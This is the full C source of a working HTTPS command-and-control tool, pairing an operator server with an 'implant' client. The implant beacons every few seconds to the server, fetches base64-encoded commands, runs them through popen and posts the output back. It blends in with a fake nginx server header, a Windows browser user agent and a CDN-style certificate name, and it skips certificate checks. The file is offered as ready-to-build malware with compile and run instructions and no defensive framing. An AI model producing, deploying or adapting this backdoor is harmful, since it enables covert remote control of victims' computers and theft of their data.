/*
 * https_shell.c — HTTPS covert channel remote shell
 *
 * The server is the operator console.  The implant (client) beacons to GET /b,
 * picks up a base64-encoded command, executes it, and POSTs base64 output to /r.
 *
 * Compile (macOS / Linux):
 *   gcc -O2 -Wall -Wextra -std=c17 -o https_shell https_shell.c \
 *       $(pkg-config --cflags --libs openssl) -lpthread
 *
 * Generate cert before running the server:
 *   openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
 *           -days 365 -nodes -subj '/CN=cdn.example.com'
 *
 * Run:
 *   sudo ./https_shell server [--port 443] --cert cert.pem --key key.pem
 *        ./https_shell client <server_ip> [--port 443]
 *
 * Protocol:
 *   GET  /b  → {"id":<int>,"cmd":"<base64>"}   (id=0 and cmd="" if nothing pending)
 *   POST /r  ← {"id":<int>,"out":"<base64>"}
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <limits.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

/* ── constants ───────────────────────────────────────────────────────────── */

#define BEACON_PATH    "/b"
#define RESULT_PATH    "/r"
#define BEACON_SECS    3
#define DEFAULT_PORT   443
#define CMD_MAX        4096
#define OUTPUT_MAX     65536
#define HTTP_BUF       (OUTPUT_MAX * 2)   /* enough for base64 + headers */
#define FAKE_SERVER    "nginx/1.24.0"

_Static_assert(HTTP_BUF > OUTPUT_MAX,  "HTTP_BUF must exceed OUTPUT_MAX to hold base64");
_Static_assert(OUTPUT_MAX < INT_MAX,   "OUTPUT_MAX must fit in int");
_Static_assert(CMD_MAX < HTTP_BUF,     "CMD_MAX must be smaller than HTTP buffer");

/* ── base64 ──────────────────────────────────────────────────────────────── */

static const char B64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static size_t b64_enc(const uint8_t *in, size_t n, char *out)
{
    size_t o = 0;
    for (size_t i = 0; i < n; i += 3) {
        uint32_t v = (uint32_t)in[i] << 16;
        if (i+1 < n) v |= (uint32_t)in[i+1] << 8;
        if (i+2 < n) v |= in[i+2];
        out[o++] = B64[(v >> 18) & 0x3F];
        out[o++] = B64[(v >> 12) & 0x3F];
        out[o++] = (i+1 < n) ? B64[(v >> 6) & 0x3F] : '=';
        out[o++] = (i+2 < n) ? B64[ v        & 0x3F] : '=';
    }
    out[o] = '\0';
    return o;
}

static int b64_val(char c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return 26 + (c - 'a');
    if (c >= '0' && c <= '9') return 52 + (c - '0');
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static size_t b64_dec(const char *in, size_t n, uint8_t *out)
{
    uint32_t v = 0; int vb = 0; size_t o = 0;
    for (size_t i = 0; i < n && in[i] != '='; i++) {
        int c = b64_val(in[i]);
        if (c < 0) continue;
        v = (v << 6) | (uint32_t)c; vb += 6;
        if (vb >= 8) { vb -= 8; out[o++] = (uint8_t)(v >> vb); }
    }
    return o;
}

/* ── tiny JSON helpers ───────────────────────────────────────────────────── */

/* Extract integer value for key from a flat JSON object. */
static int json_int(const char *json, const char *key)
{
    char pat[64];
    snprintf(pat, sizeof pat, "\"%s\":", key);
    const char *p = strstr(json, pat);
    if (!p) return 0;
    p += strlen(pat);
    while (*p == ' ') p++;
    return (int)strtol(p, NULL, 10);
}

/* Extract string value for key; writes to out[size]. Returns length or -1. */
static int json_str(const char *json, const char *key, char *out, int size)
{
    char pat[64];
    snprintf(pat, sizeof pat, "\"%s\":\"", key);
    const char *p = strstr(json, pat);
    if (!p) return -1;
    p += strlen(pat);
    const char *e = strchr(p, '"');
    if (!e) return -1;
    int len = (int)(e - p);
    if (len >= size) len = size - 1;
    memcpy(out, p, len);
    out[len] = '\0';
    return len;
}

/* ── SSL / HTTP helpers ──────────────────────────────────────────────────── */

/* Read one line (strips \r\n). Returns chars written. */
static int ssl_readline(SSL *ssl, char *buf, int size)
{
    int i = 0; char c;
    while (i < size - 1) {
        int n = SSL_read(ssl, &c, 1);
        if (n <= 0) break;
        if (c == '\r') continue;
        if (c == '\n') break;
        buf[i++] = c;
    }
    buf[i] = '\0';
    return i;
}

/* Read HTTP request line + headers.  Returns 0 on success. */
static int http_read_request(SSL *ssl, char *method, int msize,
                              char *path, int psize, int *clen)
{
    char line[4096];
    ssl_readline(ssl, line, sizeof line);
    if (sscanf(line, "%15s %1023s", method, path) != 2) return -1;
    method[msize - 1] = path[psize - 1] = '\0';
    *clen = 0;
    while (ssl_readline(ssl, line, sizeof line) > 0) {
        if (strncasecmp(line, "Content-Length:", 15) == 0) {
            char *end;
            long v = strtol(line + 15, &end, 10);
            if (end != line + 15 && v > 0 && v < HTTP_BUF)
                *clen = (int)v;
        }
    }
    return 0;
}

/* Read HTTP response headers; return Content-Length (or -1 on error). */
static int http_read_response_headers(SSL *ssl)
{
    char line[4096];
    ssl_readline(ssl, line, sizeof line);   /* status line */
    int clen = -1;
    while (ssl_readline(ssl, line, sizeof line) > 0) {
        if (strncasecmp(line, "Content-Length:", 15) == 0)
            clen = atoi(line + 15);
    }
    return clen;
}

/* Read exactly n bytes from SSL into buf. */
static int ssl_read_exact(SSL *ssl, char *buf, int n)
{
    int got = 0;
    while (got < n) {
        int r = SSL_read(ssl, buf + got, n - got);
        if (r <= 0) return got;
        got += r;
    }
    buf[got] = '\0';
    return got;
}

static void ssl_write_str(SSL *ssl, const char *s)
{
    SSL_write(ssl, s, (int)strlen(s));
}

static void http_send_json(SSL *ssl, int code, const char *json)
{
    char hdr[512];
    snprintf(hdr, sizeof hdr,
        "HTTP/1.0 %d OK\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "Server: " FAKE_SERVER "\r\n"
        "\r\n",
        code, strlen(json));
    ssl_write_str(ssl, hdr);
    ssl_write_str(ssl, json);
}

static void http_send_404(SSL *ssl)
{
    const char *body = "<!DOCTYPE html><html><body>Not Found</body></html>";
    char hdr[256];
    snprintf(hdr, sizeof hdr,
        "HTTP/1.0 404 Not Found\r\n"
        "Content-Type: text/html\r\n"
        "Content-Length: %zu\r\n"
        "Server: " FAKE_SERVER "\r\n"
        "\r\n",
        strlen(body));
    ssl_write_str(ssl, hdr);
    ssl_write_str(ssl, body);
}

/* ── C2 shared state (server) ────────────────────────────────────────────── */

typedef struct {
    pthread_mutex_t mu;
    pthread_cond_t  result_cond;
    int     pending_id;              /* 0 = no pending command */
    char    pending_cmd[CMD_MAX];
    int     result_id;               /* 0 = no result waiting */
    uint8_t result_buf[OUTPUT_MAX];
    size_t  result_len;
} c2_t;

static c2_t g_c2;   /* zero-initialized; mutex/cond set at runtime */
static int  g_next_id = 1;

static int c2_push_cmd(const char *cmd)
{
    pthread_mutex_lock(&g_c2.mu);
    int id = g_next_id++;
    g_c2.pending_id = id;
    snprintf(g_c2.pending_cmd, CMD_MAX, "%s", cmd);
    pthread_mutex_unlock(&g_c2.mu);
    return id;
}

/* Returns 1 and fills id/cmd if a command is pending, else 0. */
static int c2_peek(int *id, char *cmd)
{
    pthread_mutex_lock(&g_c2.mu);
    int has = (g_c2.pending_id != 0);
    if (has) { *id = g_c2.pending_id; snprintf(cmd, CMD_MAX, "%s", g_c2.pending_cmd); }
    pthread_mutex_unlock(&g_c2.mu);
    return has;
}

static void c2_ack(int id)
{
    pthread_mutex_lock(&g_c2.mu);
    if (g_c2.pending_id == id) g_c2.pending_id = 0;
    pthread_mutex_unlock(&g_c2.mu);
}

static void c2_store_result(int id, const uint8_t *data, size_t len)
{
    pthread_mutex_lock(&g_c2.mu);
    g_c2.result_id  = id;
    g_c2.result_len = len < OUTPUT_MAX ? len : OUTPUT_MAX;
    memcpy(g_c2.result_buf, data, g_c2.result_len);
    pthread_cond_signal(&g_c2.result_cond);
    pthread_mutex_unlock(&g_c2.mu);
}

/* Block until result for id arrives or timeout (seconds). Returns 1 on success. */
static int c2_wait_result(int id, int timeout_s,
                           uint8_t **buf_out, size_t *len_out)
{
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    ts.tv_sec += timeout_s;

    pthread_mutex_lock(&g_c2.mu);
    while (g_c2.result_id != id) {
        if (pthread_cond_timedwait(&g_c2.result_cond, &g_c2.mu, &ts) == ETIMEDOUT)
            break;
    }
    int ok = (g_c2.result_id == id);
    if (ok) {
        *buf_out = g_c2.result_buf;
        *len_out = g_c2.result_len;
        g_c2.result_id = 0;
    }
    pthread_mutex_unlock(&g_c2.mu);
    return ok;
}

/* ── connection handler (one thread per connection) ──────────────────────── */

typedef struct { SSL *ssl; int fd; char ip[INET_ADDRSTRLEN]; } conn_t;

static void *handle_conn(void *arg)
{
    conn_t *c = (conn_t *)arg;
    SSL    *ssl = c->ssl;
    char   *ip  = c->ip;
    free(c);

    if (SSL_accept(ssl) <= 0) goto done;

    char method[16], path[1024]; int clen;
    if (http_read_request(ssl, method, sizeof method,
                           path, sizeof path, &clen) < 0)
        goto done;

    /* GET /b — beacon */
    if (!strcmp(method, "GET") && !strcmp(path, BEACON_PATH)) {
        int id = 0; char cmd[CMD_MAX]; char b64cmd[CMD_MAX * 2];
        if (c2_peek(&id, cmd)) {
            b64_enc((uint8_t *)cmd, strlen(cmd), b64cmd);
        } else {
            id = 0; b64cmd[0] = '\0';
        }
        char resp[CMD_MAX * 2 + 64];
        snprintf(resp, sizeof resp, "{\"id\":%d,\"cmd\":\"%s\"}", id, b64cmd);
        fprintf(stderr, "  [>] %-16s  GET %s  id=%d\n", ip, path, id);
        http_send_json(ssl, 200, resp);
        goto done;
    }

    /* POST /r — result */
    if (!strcmp(method, "POST") && !strcmp(path, RESULT_PATH) && clen > 0) {
        char *body = (char *)malloc(clen + 1);
        if (!body) goto done;
        ssl_read_exact(ssl, body, clen);

        int    id       = json_int(body, "id");
        char   b64out[HTTP_BUF]; b64out[0] = '\0';
        json_str(body, "out", b64out, sizeof b64out);
        free(body);

        uint8_t *raw = (uint8_t *)malloc(OUTPUT_MAX + 1);
        if (raw) {
            size_t rlen = b64_dec(b64out, strlen(b64out), raw);
            c2_store_result(id, raw, rlen);
            c2_ack(id);
            free(raw);
        }
        fprintf(stderr, "  [>] %-16s  POST %s  id=%d\n", ip, path, id);
        http_send_json(ssl, 200, "{\"ok\":true}");
        goto done;
    }

    http_send_404(ssl);

done:
    SSL_shutdown(ssl);
    SSL_free(ssl);
    return NULL;
}

/* ── listener thread ─────────────────────────────────────────────────────── */

typedef struct { SSL_CTX *ctx; int lfd; } listen_arg_t;

static void *listener(void *arg)
{
    listen_arg_t *la = (listen_arg_t *)arg;
    for (;;) {
        struct sockaddr_in peer = {0};
        socklen_t plen = sizeof peer;
        int fd = accept(la->lfd, (struct sockaddr *)&peer, &plen);
        if (fd < 0) continue;

        SSL *ssl = SSL_new(la->ctx);
        SSL_set_fd(ssl, fd);

        conn_t *c = (conn_t *)malloc(sizeof *c);
        c->ssl = ssl; c->fd = fd;
        inet_ntop(AF_INET, &peer.sin_addr, c->ip, sizeof c->ip);

        pthread_t t;
        if (pthread_create(&t, NULL, handle_conn, c) != 0) {
            SSL_free(ssl); close(fd); free(c);
        } else {
            pthread_detach(t);
        }
    }
    return NULL;
}

/* ── command execution ───────────────────────────────────────────────────── */

static uint8_t *run_cmd(const char *cmd, size_t *out_len)
{
    uint8_t *buf = (uint8_t *)malloc(OUTPUT_MAX + 1);
    if (!buf) { *out_len = 0; return NULL; }
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        snprintf((char *)buf, OUTPUT_MAX, "(popen: %s)\n", strerror(errno));
        *out_len = strlen((char *)buf);
        return buf;
    }
    size_t n = fread(buf, 1, OUTPUT_MAX, fp);
    pclose(fp);
    if (n == 0) { memcpy(buf, "(no output)\n", 13); n = 12; }
    *out_len = n;
    return buf;
}

/* ── local IP ────────────────────────────────────────────────────────────── */

static void print_local_ip(void)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET; a.sin_port = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &a.sin_addr);
    if (connect(s, (struct sockaddr *)&a, sizeof a) == 0) {
        struct sockaddr_in local = {0}; socklen_t len = sizeof local;
        getsockname(s, (struct sockaddr *)&local, &len);
        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &local.sin_addr, ip, sizeof ip);
        printf("[*] Server IP  : %s\n", ip);
    }
    close(s);
}

/* ── server ──────────────────────────────────────────────────────────────── */

static void do_server(int port, const char *cert, const char *key)
{
    pthread_mutex_init(&g_c2.mu, NULL);
    pthread_cond_init(&g_c2.result_cond, NULL);

    SSL_CTX *ctx = SSL_CTX_new(TLS_server_method());
    if (!ctx) { ERR_print_errors_fp(stderr); exit(1); }
    if (SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM) <= 0 ||
        SSL_CTX_use_PrivateKey_file(ctx,  key,  SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr); exit(1);
    }

    int lfd = socket(AF_INET, SOCK_STREAM, 0);
    int one = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);

    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons((uint16_t)port);
    if (bind(lfd, (struct sockaddr *)&addr, sizeof addr) < 0) { perror("bind"); exit(1); }
    listen(lfd, 16);

    listen_arg_t la = { ctx, lfd };
    pthread_t lt;
    pthread_create(&lt, NULL, listener, &la);
    pthread_detach(lt);

    print_local_ip();
    printf("[*] HTTPS C2   : https://0.0.0.0:%d\n", port);
    printf("[*] Cert       : %s\n", cert);
    printf("[*] Beacon     : GET %s  POST %s\n\n", BEACON_PATH, RESULT_PATH);

    char cmd[CMD_MAX];
    for (;;) {
        printf("https> "); fflush(stdout);
        if (!fgets(cmd, sizeof cmd, stdin)) break;
        size_t len = strlen(cmd);
        while (len && (cmd[len-1] == '\n' || cmd[len-1] == '\r')) cmd[--len] = '\0';
        if (!len) continue;
        if (!strcmp(cmd, "exit") || !strcmp(cmd, "quit")) break;

        int id = c2_push_cmd(cmd);
        printf("[*] Queued (id=%d), waiting for next beacon…\n", id);

        uint8_t *result; size_t rlen;
        if (!c2_wait_result(id, 30, &result, &rlen)) {
            printf("[!] Timed out — no beacon within 30 s.\n");
        } else {
            fwrite(result, 1, rlen, stdout);
            fflush(stdout);
        }
    }

    SSL_CTX_free(ctx);
    close(lfd);
}

/* ── client (implant) ────────────────────────────────────────────────────── */

static SSL *open_ssl_conn(SSL_CTX *ctx, const char *host, int port)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return NULL;

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons((uint16_t)port);
    if (inet_pton(AF_INET, host, &dst.sin_addr) != 1) { close(fd); return NULL; }
    if (connect(fd, (struct sockaddr *)&dst, sizeof dst) < 0) { close(fd); return NULL; }

    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, fd);
    if (SSL_connect(ssl) <= 0) { SSL_free(ssl); close(fd); return NULL; }
    return ssl;
}

static void close_ssl_conn(SSL *ssl)
{
    int fd = SSL_get_fd(ssl);
    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(fd);
}

static void do_client(const char *host, int port)
{
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);   /* accept self-signed */

    printf("[*] Implant beaconing → https://%s:%d  (every %ds)\n",
           host, port, BEACON_SECS);

    int last_id = 0;
    char b64cmd[CMD_MAX * 2];
    char body[HTTP_BUF];
    char b64out[HTTP_BUF];

    for (;;) {
        /* --- beacon --- */
        SSL *ssl = open_ssl_conn(ctx, host, port);
        if (ssl) {
            char req[256];
            snprintf(req, sizeof req,
                "GET %s HTTP/1.0\r\nHost: %s\r\n"
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n",
                BEACON_PATH, host);
            ssl_write_str(ssl, req);

            int clen = http_read_response_headers(ssl);
            int id = 0;
            b64cmd[0] = '\0';

            if (clen > 0 && clen < (int)sizeof body) {
                ssl_read_exact(ssl, body, clen);
                id = json_int(body, "id");
                json_str(body, "cmd", b64cmd, sizeof b64cmd);
            }
            close_ssl_conn(ssl);

            if (id && id != last_id && b64cmd[0]) {
                last_id = id;

                /* decode and execute */
                uint8_t cmd_raw[CMD_MAX]; cmd_raw[0] = '\0';
                size_t cmd_len = b64_dec(b64cmd, strlen(b64cmd), cmd_raw);
                cmd_raw[cmd_len] = '\0';

                size_t out_len;
                uint8_t *output = run_cmd((char *)cmd_raw, &out_len);

                /* post result */
                b64_enc(output, out_len, b64out);
                free(output);

                char result_body[HTTP_BUF];
                snprintf(result_body, sizeof result_body,
                         "{\"id\":%d,\"out\":\"%s\"}", id, b64out);

                SSL *ssl2 = open_ssl_conn(ctx, host, port);
                if (ssl2) {
                    char hdr[512];
                    snprintf(hdr, sizeof hdr,
                        "POST %s HTTP/1.0\r\nHost: %s\r\n"
                        "Content-Type: application/json\r\n"
                        "Content-Length: %zu\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n",
                        RESULT_PATH, host, strlen(result_body));
                    ssl_write_str(ssl2, hdr);
                    ssl_write_str(ssl2, result_body);
                    http_read_response_headers(ssl2);   /* drain */
                    close_ssl_conn(ssl2);
                }
            }
        }

        sleep(BEACON_SECS);
    }

    SSL_CTX_free(ctx);
}

/* ── main ────────────────────────────────────────────────────────────────── */

_Noreturn static void usage(const char *prog)
{
    fprintf(stderr,
        "usage: %s server [--port N] --cert cert.pem --key key.pem\n"
        "       %s client <server_ip> [--port N]\n", prog, prog);
    exit(1);
}

int main(int argc, char *argv[])
{
    if (argc < 2) usage(argv[0]);

    const char *mode = argv[1];
    int port = DEFAULT_PORT;
    const char *cert = NULL, *key = NULL, *host = NULL;

    for (int i = 2; i < argc; i++) {
        if (!strcmp(argv[i], "--port") && i+1 < argc) port = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--cert") && i+1 < argc) cert = argv[++i];
        else if (!strcmp(argv[i], "--key")  && i+1 < argc) key  = argv[++i];
        else if (!host) host = argv[i];
    }

    if (!strcmp(mode, "server")) {
        if (!cert || !key) {
            fprintf(stderr, "[!] --cert and --key required\n"
                "    Generate: openssl req -x509 -newkey rsa:2048 "
                "-keyout key.pem -out cert.pem -days 365 -nodes "
                "-subj '/CN=cdn.example.com'\n");
            return 1;
        }
        do_server(port, cert, key);
    } else if (!strcmp(mode, "client")) {
        if (!host) { fprintf(stderr, "missing server IP\n"); usage(argv[0]); }
        do_client(host, port);
    } else {
        usage(argv[0]);
    }
    return 0;
}
